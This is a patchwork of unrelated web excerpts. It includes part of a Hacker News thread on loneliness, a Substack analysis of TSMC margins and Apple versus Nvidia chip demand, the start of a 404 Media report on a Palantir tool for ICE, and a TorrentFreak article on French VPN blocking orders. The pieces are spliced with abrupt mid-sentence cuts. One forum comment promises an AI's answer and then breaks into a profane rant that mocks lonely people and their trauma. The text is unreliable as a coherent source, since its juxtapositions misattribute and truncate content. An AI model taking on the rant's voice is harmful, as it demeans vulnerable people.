aren't scrutinizing them that much. There's like a socialization death spiral where every small awkward interaction hurts way more when you don't have enough experience to know that the small awkward interactions are normal. So you can't tell someone "just go to book club" because they'll go, have 1 normal situation like mishearing someone and then decide they are so embarrassed they can never go to book club again-- but since it is so normal it happens at every social event and they end up lonely.</p></div></td></tr></tbody></table></td></tr><tr id="46637257"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46637257" href="https://news.ycombinator.com/vote?id=46637257&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>You actually bring up the biggest obstacle to my tentative idea for this Sunday, of holding up a sign that points to a time/place for a casual conversation with strangers. I thought this would be a good way to get very lonely passers-by out of their comfort zone and into a situation where they have a chance to make friends and bond, but the absolute diversity of interests is the main show stopper. My first thought was to essentially avoid sensitive topics on the poster, such as religion and politics, but it still leaves the huge diversity of potential common interests open. So I started doing some research on the most common hobbies that people have in cities and that can be talked about casually, in hopes of finding like 5 ot 6 to write on the sign to get people into the coffee shop.</p></div></td></tr></tbody></table></td></tr><tr id="46638216"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46638216" href="https://news.ycombinator.com/vote?id=46638216&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>Loneliness epidemic started 30+ years ago. There were books written in the 90s about it(bowling alone). Nothing modern can be blamed on it. If anything, social media is helping the crisis; not causing.</p><p>The 'fixes' has been established for just as long. My nearby 'community centre' was built in 1987. Has this been successful at all? Not in the least bit.</p><p>The reality of what is causing this hasnt changed. Without fixing this key problem, the crisis obviously has continued for 30+ years. I'm not nostradamus here. However, from many previous conversations it's crazy how absolutely nobody is ready to talk about the cause. They'd rather just call it a paradox or feign ignorance for why this is happening. Honestly it's rather conspiratorial creating when you think about it.</p><p>Out of curiousity I asked what gemini 3 pro thinks.</p><p>1.

It is almost a grift now to shit on tech by mids.</p><p>These people don't want to go outside or engage with other people.</p><p>It is like people who are drug/alcohol/tobacco/gambling/sex/etc addicts. It is up to the individual to change. How is it anyone else's responsibility?</p><p>I surveyed a bunch of people on reddit, discords, etc. a couple years ago to figure out why people are lonely, back when this whole "loneliness" movement was starting.</p><p>A lot of these people say they have "trauma" or some other mental block as a primary reason why they're lonely (btw they're in discords with thousands of people, and playing online games with OTHER PEOPLE). I'm sorry but everyone has shit going on in their lives. You aren't really that special.</p><p>Maybe 1-5% of people have dealt with actual, really horrific trauma, and even they have managed to go on to have fulfilling lives. They chose to move on.</p><p>I'm an asshole, no doubt, and I've dealt with my own traumas in the past that were honestly way more fucking horrible than "I'm shy" or "nobody likes [insert some esoteric niche]" and guess what? Who cares? Go outside.</p><p>There is no helping these people, or anyone to be honest, unless they really want to make a change. These aren't starving Sudanese or people who live in India or something where you can't just "go outside". Mfs be in CALIFORNIA and crying. I'd understand if they were lonely because they were living in Iraq or Venezuela or something.</p><p>The only solution is we build a Matrix, and put all these people into it. I will bet 100% of my net worth and any earnings from my entire lineage for perpetuity that they will still fucking complain and be lonely. I was really hopeful for metaverse, too bad but maybe there's still a chance.</p><p>I never want to hear about "loneliness epidemic" again, to me it just sounds like DEI/ESG/Eacc and other bs grifting now to hate on tech. Everything is a choice. You press A in a video game even though you're lonely, why not press A to go outside?</p><p>These people aren't lonely, they exist in massive online echo chambers with other people. And honestly?

<div><p>from what I've looked into, on an individual level, the main thing I need to do is learn how to be a good company for others. Be for other strangers what I would want them to be for me. But it's easier said then done.</p><p>From a practical perspective, there is the whole "3rd place" issue. How can I open a business that caters to the public, who will just sit there and loiter on their phones and laptops all day and be profitable. Starbucks sort of did it in the 90s, but they're not tolerating that anymore.</p><p>Forget businesses, can you walk to a park, a beach, a hiking trail on a whim and run into people? Can you hold events, watch parties,etc.. on public places easily like that? It's not easy at all these days.</p><p>I blame cars. I despise the idea that electric cars are the replacement to cars, without considering changing transportation so that it is more efficient with trams, trains,etc... The side-effect of that is you run into strangers on public transport. This doesn't just affect the loneliness epidemic, it is in my opinion a direct cause of cardiovascular diseases and diabetes, and of course obesity. You can't even be homeless and sleep on the streets these days. Even the park benches are built to be hostile to anyone that wants to chill there for too long.</p><p>Society was restructured between 1950s-1980s so that it is suburbanized. It's all about the family unit, single family homes, freeways and roads built to facilitate single family homes (after WW2, starting families was all the rage, plus white-flight didn't help). Shopping centers built to cater to consumers driving from their suburban homes. Malls you can walk in, after you drove some time to park there.

Families spend more per-capita. suburbs mean more houses purchased, entire generations renting with their bank as a landlord via mortgages, home repair, home insurance, car insurance, car repairs, gas stations for cars where you can get the most unhealthy things out there in the most frequented and convenient places. Make kids, make wives, make ex-wives, get sick the whole lot of you for hospitals, health insurances,etc..</p><p>It wasn't planned by some central committees or secret cabal, but it was planned nonetheless by economists and policy makers.</p><p>If everyone just got married and had kids, they won't be lonely would they? you don't need to hang out at park with strangers, you'll feel less of a member of your local neighborhood who look and think like you, and start thinking more as one people.</p><p>All the interpersonal interactions and opportunities to build relationships with people are commercialized and controlled.</p><p>For one reason or another, people are just not getting married in their early 20's anymore, or having that many kids later on like before. Even when you get married, your interaction is by design with other married people, who are busy commuting in their cars to and fro work, kids school,kids sports, plays,etc... imagine taking your kids on busses and trains every day to these places which are fairly near-by, by necessity. you'll be spending time with them instead of operating machinery. They'll be meeting stranger kids from other schools, seeing random strangers all the time, you'll be talking to randos as you walk to the train, wait on the bus,etc.. but this can't be monetized.</p><p>Blame the economists and policy makers if you want to blame someone.</p><p>If you want solutions, let's talk explicitly about the policy changes that need to happen.</p><p>Too much traffic? tear down the freeways instead of building more lanes.</p><p>It costs $10B to build a simple metro line? pass better laws to regulate bidding and costs, investigate fraud and waste.</p><p>But to dig even deeper into the root of the matter, look at what is celebrated and prized in society. Most of its ills come from there. For most Americans, it is inconceivable to be able to just go out of your house without any plans or destination in mind and just start walking and see where you end up, and who you run into. That's a crucial and tragic ability that's been lost. We really have more urgent things to address to be fair, but ultimately, this can only be solved one small step at a time, but also big sweeping changes are needed. The first step is to define and accept what the problem is, and where the blame and cause lie.</p></div></td></tr></tbody></table></td></tr><tr id="46637163"><td></td></tr><tr id="46637808"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46637808" href="https://news.ycombinator.com/vote?id=46637808&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

That’s higher than a prior forecast for a mid-40 percent figure.</p><p>The ultimate flex for TSMC came Thursday when it showed off not only record revenue and net income, but a gross margin approaching that of software makers and fabless chip designers. In the December quarter, that figure was an astounding 62.3%, 280 basis points higher than the prior period. If not for its overseas fabs (Arizona and Japan) gross margin would have been even higher.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!J4zY!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!J4zY!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 424w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 848w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1272w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png" width="1456" height="785" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/dd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1ebe39a3-42ac-457e-9fa9-d4d3a8b48fb4_2425x1307.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:785,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:389692,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1ebe39a3-42ac-457e-9fa9-d4d3a8b48fb4_2425x1307.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!J4zY!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 424w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 848w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1272w, https://substackcdn.com/image/fetch/$s_!J4zY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd1d46de-ec4e-4552-8f89-326742a4101f_2425x1307.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>There are two caveats that are important. First, while smartphone processors are the largest portion of chips bought by Apple, they’re not the only type. Processors for Macs come under HPC, while it also has a strong lineup of custom chips used in accessories which fall under digital consumer electronics. Second, Nvidia isn’t the only HPC client. AMD is a major buyer of capacity for its own GPUs while Amazon and Google are on the growing list of customers developing in-house AI chips.</p><p>Put another way, Apple’s chip catalog is broader and more varied, while Nvidia’s lineup is more concentrated around a huge number of wafers at, or near, leading-edge. It’s for these reasons that Apple will remain important for at least another decade.</p><p>In the near-term, however, TSMC’s technology roadmap coupled with broader industry trends favor Nvidia, AMD and their ilk, meaning Apple may need to keep fighting for capacity over the next year or two. </p><p>TSMC is already producing chips in volume at 2 nanometer (called N2), currently its most advanced node, with Apple a major buyer. But in the second half of this year it’s set to ramp up both a new variant called N2P as well as a new node called A16. </p><p><span>The company’s business model is a little quirky. Instead of repurposing an existing factory for new technology, TSMC just builds a new one. This ensures no interruption to output and allows it to squeeze the most out of old tools and processes. In general, this means any new capacity that TSMC builds is for a new node. As a result, it has numerous fabs still churning out chips on technology that’s a decade older or more.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-184494017" href="https://www.culpium.com/p/exclusiveapple-is-fighting-for-tsmc#footnote-3-184494017" target="_self" rel="">3</a></span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!CHPp!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!CHPp!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 424w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 848w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1272w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png" width="1456" height="683" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/349cdf18-9651-4c1f-9d5e-569352323bf2_1920x900.jpeg&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:683,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:531378,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F349cdf18-9651-4c1f-9d5e-569352323bf2_1920x900.jpeg&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!CHPp!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 424w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 848w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1272w, https://substackcdn.com/image/fetch/$s_!CHPp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F07f25979-e964-495a-9a65-7d1790aabd2e_1920x900.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In TSMC CEO CC Wei’s words A16, with Super Power Rail, is “best for HPC with complex signal routes.” SPR is TSMC’s version of backside power, a newer approach designed to separate a chip’s signal from its power supply. Intel is also developing this technology, and many believe it’ll be the key to the US company’s prospects at stealing foundry share from its Taiwan rival.</p><p><span>After that, TSMC has A14 which it expects to bring into volume production around 2028. Some call this the next full node after N2, labeling A16 as not a “full node.” In truth, all of these names are as much marketing terms as they are technology designators. Nevertheless, as SemiAnalysis recently wrote in </span><a href="https://newsletter.semianalysis.com/p/apple-tsmc-the-partnership-that-built" rel="">a fabulous report on the TSMC-Apple relationship,</a><span> the balance will shift back to Apple because A14 is designed “for both mobile and HPC from the start.”</span></p><p>More importantly, what Apple offers is stability. Nvidia has been a client for a lot longer than Apple, but broadly speaking it’s a bit niche. Right now that “niche” is the hottest product on the planet, but niche it is. Apple, on the other hand, has products being made in no fewer than a dozen TSMC fabs. Even if Nvidia did overtake Apple by purchases, the breadth of its manufacturing footprint at TSMC is nowhere near as large.</p><p>This distinction may not matter now, but it probably will at some point. The AI boom won’t last forever. The bubble may burst, or it may slowly deflate, but the growth trajectory will surely flatten and that means demand for leading-edge AI chips will fall. </p><p>Wei knows this, which is why he’s expanding both quickly yet cautiously. “I am also very nervous,” he said at the company’s investor conference on Thursday in Taipei. “If we didn’t do it carefully, it would be a big disaster for TSMC for sure.”</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!GWXo!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!GWXo!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 424w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 848w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 1272w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!GWXo!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png" width="1456" height="797" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1dc9afaa-c984-405e-a70f-b39c40f9f583_3603x1973.jpeg&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:797,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1305006,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1dc9afaa-c984-405e-a70f-b39c40f9f583_3603x1973.jpeg&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!GWXo!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 424w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 848w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 1272w, https://substackcdn.com/image/fetch/$s_!GWXo!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9da34660-8a4f-4843-9fae-63aa065bb4d5_3603x1973.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>TSMC executives speak at TSMC’s 4Q 2025 Investor Conference on 15 Jan 2026 in Taipei.

For TSMC, this figure is more than four times higher at 45%. </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!0bYq!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!0bYq!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 424w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 848w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 1272w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!0bYq!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png" width="1456" height="819" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png&quot;,&quot;srcNoWatermark&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f273d12c-9d9b-495b-9b5d-26a72bb9d7bb_1920x1080.jpeg&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:819,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:456637,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.culpium.com/i/184494017?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff273d12c-9d9b-495b-9b5d-26a72bb9d7bb_1920x1080.jpeg&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!0bYq!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 424w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 848w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 1272w, https://substackcdn.com/image/fetch/$s_!0bYq!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa97aaae9-1ba1-4123-acf0-51939f77d1b5_1920x1080.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>At Nvidia, which is a tier-one buyer of TSMC’s output, the data is more stark. Capital intensity was just 2.5% for 2024, while depreciation was only 5.7% of the cost of revenue. As a fabless chipmaker, it can enjoy gross margins of over 70%. Its only real risk is holding excess inventory. Even then, it could have written off its entire inventory at the end of October and still maintain a gross margin approaching that of its chief supplier. What’s more, neither of these clients have anywhere near the customer-concentration risk of TSMC.</p><p>The complaint that TSMC could and should build faster ignores the fact that it’s the one left holding the baby if a downturn comes and demand falls. It takes two to three years to build a new fab, Wei explained, so the company must skate where the puck is going without thinking too much about where it’s been. “Even if we spend 52 to 56 billion this year, the contribution this year is none,“ Wei said Thursday. Its major cost, buying equipment, remains on the books no matter what revenue it brings in for the quarter. </p><p>For the best part of a decade, Apple was the one driving TSMC’s need to keep spending on new facilities. Today it’s Nvidia, and Jensen Huang is starting to wield more power than Tim Cook. But neither has to bother with the expensive business of actually manufacturing semiconductors, merely the hassle of begging CC Wei for wafers.</p><p><span>For such clients, the foundry’s capacity is a fixed cost that they needn’t worry about.

<p>Palantir is working on a tool for Immigration and Customs Enforcement (ICE) that populates a map with potential deportation targets, brings up a dossier on each person, and provides a “confidence score” on the person’s current address, 404 Media has learned. ICE is using it to find locations where lots of people it might detain could be based.&nbsp;</p><p>The findings, based on internal ICE material obtained by 404 Media, public procurement records, and recent sworn testimony from an ICE official, show the clearest link yet between the technological infrastructure Palantir is building for ICE and the agency’s activities on the ground. The tool receives peoples’ addresses from the Department of Health and Human Services (HHS) among a range of other sources, according to the material.</p><div><p>💡</p><p><b><strong>Do you know anything else about this tool?

<p>Initially, rightsholders set their aim at DNS resolvers. This resulted in orders targeted at Cloudflare, Google, and others, requiring them to actively block access to pirate sites through their public DNS resolvers.</p>
<p>These blocking expansions were requested by sports rights holders, covering Formula 1, football Ligue 1, MotoGP, and other major sporting brands. They claimed that public DNS resolvers could help users to bypass existing ISP blockades, and the court agreed.</p>
<p>Last year, rightsholders cast their net even wider by targeting VPN providers with similar blocking demands. Again, the Paris Court acknowledged the threat of circumvention, ordering CyberGhost, ExpressVPN, NordVPN, ProtonVPN, and Surfshark to start blocking access to specific websites in France.</p>
<h2>VPN Blocking Expands</h2>
<p>The VPN blocking effort was not a one-off. After the first order was granted in May, more <a href="https://torrentfreak.com/french-court-orders-vpns-to-block-more-pirate-sites-rejects-eu-court-referral/">followed in June and July</a>. These additional orders target various sports piracy sites as requested by the French entertainment powerhouse Canal Plus (SECP) and beIN Sports. </p>
<p>After this initial barrage, the blocking activity seemed to have quieted down, but it is far from over. On December 18, the Paris Judicial Court issued a new blocking order. This time around, the French top football league (LFP) and its commercial arm are the requesting parties. </p>
<p>As in previous orders, ProtonVPN, Nordvpn, Cyberghost, Surfshark and ExpressVPN are the main targets. These VPN providers have to block access to several domains that provide access to pirated sports streams. </p>
<p>The order covers 13 initial domains, including miztv.top, strikeout.im, and prosmarterstv.com. However, it is a ‘dynamic’ order in the sense that, through the overseeing body ARCOM, LFP can add new domains in case additional mirrors and proxies are launched. These blocks remain active for the entire 2025/2026 football season. </p>
<p>The court concludes that these VPNs help people to bypass existing site-blocking measures, rendering ISP blocking ineffective. While the VPN blockades are no silver bullet, combined with other blocking measures they should make it more difficult to access these pirate sites.</p>
<h2>The No-Log Defense</h2>
<p>All VPN providers, except ProtonVPN, appeared in court to argue a defense. They raised various arguments, with the “no-log” defense from Surfshark and NordVPN standing out. </p>
<p>Specifically, the VPNs argued that their “no-log” policy means they do not track user IP addresses or geolocate their users. Therefore, a court order to block access only for French users would violate their contractual obligations. </p>
<p>The court was not very receptive to this argument. Instead, it bluntly concluded that “the contractual stipulations binding VPN service providers to their clients cannot be invoked against [the plaintiffs] who have demonstrated an infringement of their rights.” </p>
<p>The court stressed that blocking the domains does not require the service to permanently store information on its users. The VPNs simply have to make sure that the sites are blocked from France.</p>
<p>In addition, the court rejected the notion that the blocking measures would constitute a “general monitoring obligation”, which is not allowed under the EU’s DSA, because the measures are limited to specific domains and end after the 2025-2026 football season.</p>
<h2>Court Rejects Other Defenses</h2>
